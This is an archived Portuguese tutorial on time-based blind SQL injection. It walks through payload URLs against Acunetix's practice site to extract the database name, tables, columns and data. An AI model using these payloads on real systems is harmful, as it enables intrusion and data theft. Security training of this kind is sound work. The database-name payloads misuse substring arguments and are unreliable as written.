# Time-based SQL Injection

- **Source URL:** https://medium.com/@r3du/time-based-sql-injection-130ba49521f2?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251126142627/https://medium.com/@r3du/time-based-sql-injection-130ba49521f2
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3499 (id 3499)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Time-based SQL Injection

Nesse artigo irei descrever como funciona o ***time-based SQL Injection,*** que ocorre quando a aplicação é vulnerável a SQL injection, porem não retorna erros como o error-***based*** e nem pode ser verificada usando as respostas true e false igual o ***blind SQL Injection***, nesse caso pode substituir a pergunta logica por tempo de espera.

## O que é?

O SQL Injection é a capacidade do atacante inserir códigos SQL dentro da aplicação, que são lidos e interpretados por ela. o ***Time-based SQL Injection*** depende do atacante ser capaz de interpretar o comportamento da aplicação que esta sendo explorada isso através do tempo de resposta, é como o *Blind SQL Injection ond*e você depende de realizar um dialogo que só existe sim e não como resposta.

## Como encontrar?

Para encontrar essa vulnerabilidade você precisa enviar uma pergunta logica, que ao ser verdadeira vai esperar **N** segundos, se não vai retornar sem tempo de esperar.

## Explorando

Para explicar a exploração vou utilizar o Vulnweb da Acunetix “[http://testphp.vulnweb.com/product.php?pic=1](http://testphp.vulnweb.com/product.php?pic=1)”

Para determinar se é vulnerável basta adicionar ***sleep(N)*** onde o **N** é o tempo em segundos que deseja esperar para determinar se é vulnerável ou não.

```
http://testphp.vulnweb.com/product.php?pic=1 and sleep(5)
http://testphp.vulnweb.com/product.php?pic=1 or sleep(5)
```
Daqui para baixo irei usar o **and,** porem usar o **or**, vai mudar pouca coisa no geral.

### Descobrir o tamanho do database

Basicamente a vai perguntar se database tem tamanho 1? se tiver espera, se não retorna, assim por diante até o delay ocorrer.

Para realizar essa pergunta vai usar os método **if(), length()** e **sleep()** a pergunta fica *if(length(database()) = N, sleep(5), 0).*

```
http://testphp.vulnweb.com/product.php?pic=1 and if(length(database()) = 1, sleep(5), 0)
http://testphp.vulnweb.com/product.php?pic=1 and if(length(database()) = 2, sleep(5), 0)
...
http://testphp.vulnweb.com/product.php?pic=1 and if(length(database()) = 6, sleep(5), 0)
```
Quando chega a 6 ele espera, demonstrando que o tamanho do database é 6.

### **Descobrir o nome do database**

Agora, sabendo o tamanho do database, a tarefa é perguntar caractere por caractere, ate achar os 6 caracteres que formam o nome da base de dados.

Para fazer essa pergunta usa o método ***ascii()*** para comparar com o caracter desejado e o método ***substring()*** para extrair o caractere para comparação.

**A consulta ficaria:**

Na posição **N** o caractere é o **“a”**? se sim espere 5 segundos

*if(ascii(substring(database(), N, 1)) = 97, sleep(5), 0)*

O nome do database é **“acuart”,** as consultas feitas para chegar nesse nome foram:

```
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 1)) = 97, sleep(5), 0)  a
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 2)) = 99, sleep(5), 0)  c
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 3)) = 117, sleep(5), 0) u
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 4)) = 97, sleep(5), 0)  a
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 5)) = 114, sleep(5), 0) r
http://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring(database(), N, 6)) = 116, sleep(5), 0) t
```
### Agora é descobrir a quantidade de caracteres nos nomes das tabelas

A pergunta é bem parecida com a para descobrir a quantidade de caracteres do database, exceto que vou realizar uma concatenação, dessa forma vou ser capaz de encontrar todas as tabelas e cada tabela é separado por virgula.

a pergunta vai ficar ***if((select length(group\_concat(table\_name)) from information\_schema.tables where table\_schema = ‘acuart’) = N, sleep(5), 0)***

```
http://testphp.vulnweb.com/product.php?pic=1 and if((select length(group_concat(table_name)) from information_schema.tables where table_schema = 'acuart') = 1, sleep(5), 0)
http://testphp.vulnweb.com/product.php?pic=1 and if((select length(group_concat(table_name)) from information_schema.tables where table_schema = 'acuart') = 2, sleep(5), 0)
...
http://testphp.vulnweb.com/product.php?pic=1 and if((select length(group_concat(table_name)) from information_schema.tables where table_schema = 'acuart') = 62, sleep(5), 0)
```
### Descobrir os nomes das tabelas

Após descobrir o tamanho total, agora posso procurar os nomes das tabelas, a separação entre as tabelas é a virgula, 44 em *ascii.*

Pergunta pela letra, por exemplo na posição N é o caracter “a”?

if(ascii(substring((select group\_concat(table\_name) from information\_schema.tables where table\_schema=”acuart”), N, 1)) = 97, sleep(5), 0)

A pergunta pela **virgula** na posição **N**:

if(ascii(substring((select group\_concat(table\_name) from information\_schema.tables where table\_schema=”acuart”), N, 1)) = 44, sleep(5), 0)

Após descobrir posição a posição até achar a virgula, o nome da primeira tabela é ***artists***.

```
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 1, 1)) = 97, sleep(5), 0)  a
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 2, 1)) = 114, sleep(5), 0) r
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 3, 1)) = 116, sleep(5), 0) t 
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 4, 1)) = 105, sleep(5), 0) i
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 5, 1)) = 115, sleep(5), 0) s
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 6, 1)) = 116, sleep(5), 0) t
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 7, 1)) = 115, sleep(5), 0) s
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="acuart"), 8, 1)) = 44, sleep(5), 0)   ,
```
### Agora é descobrir a quantidade de caracteres nos nomes da colunas

Novamente vou realizar a concatenação, agora das colunas para descobrir a quantidade de caracteres tem. a consulta vai ficar *if(length((select group\_concat(column\_name) from information\_schema.columns where table\_schema=”acuart” and table\_name=”artists”)) = N, sleep(5), 0)*

```
https://testphp.vulnweb.com/product.php?pic=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists")) = 1, sleep(5), 0)
https://testphp.vulnweb.com/product.php?pic=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists")) = 2, sleep(5), 0)
...
https://testphp.vulnweb.com/product.php?pic=1 and if(length((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists")) = 21, sleep(5), 0)
```
### Agora descobrir os nomes das colunas

Novamente percorrer posição a posição, perguntando caractere por caractere e até achar o 44.

A consulta vai ficar *if(ascii(substring((select group\_concat(column\_name) from information\_schema.columns where table\_schema=”acuart” and table\_name=”artists”), N, 1)) = ascii\_do\_caracter, sleep(5), 0)*

O nome da primeira coluna é *artist\_id*

```
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 1, 1)) = 97, sleep(5), 0)#  a
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 2, 1)) = 114, sleep(5), 0)# r
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 3, 1)) = 116, sleep(5), 0)# t
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 4, 1)) = 105, sleep(5), 0)# i
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 5, 1)) = 115, sleep(5), 0)# s
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 6, 1)) = 116, sleep(5), 0)# t
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 7, 1)) = 95, sleep(5), 0)#  _
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 8, 1)) = 105, sleep(5), 0)# i
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 9, 1)) = 100, sleep(5), 0)# d
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema="acuart" and table_name="artists"), 10, 1)) = 44, sleep(5), 0)# ,
```
### Finalmente extrair os dados

Para realizar a extração de dados é bem mais simples.

- A coluna vai ser a ***artist\_id***
- A tabela vai ser a ***artists***
- E nesse caso sei que o ***artist\_id*** é numérico, porem no mundo real pode ser alfanuméricos.

A consulta fica *if(ascii(substring((select artist\_id from artists limit N, 1), 1, 1)) = ascii\_do\_caracter, sleep(5), 0)*

Os valores da coluna ***artist\_id*** são os ids 1,2 e 3 ou em ascii 49,50 e 51.

```
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select artist_id from artists limit 0, 1), 1, 1)) = 49, sleep(5), 0)
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select artist_id from artists limit 1, 1), 1, 1)) = 50, sleep(5), 0)
https://testphp.vulnweb.com/product.php?pic=1 and if(ascii(substring((select artist_id from artists limit 2, 1), 1, 1)) = 51, sleep(5), 0)
```
### Conclusão

O SQL Injection ***Time-based*** é extremamente difícil e complexo de ser feito de maneira manual, esse artigo foi focado em compartilhar conhecimento, pois existem ferramentas que irão realizar essa tarefa de maneira automática, e tem uma taxa de sucesso ainda maior caso você já tenha feito uma analise manual e informe qual campo é vulnerável.
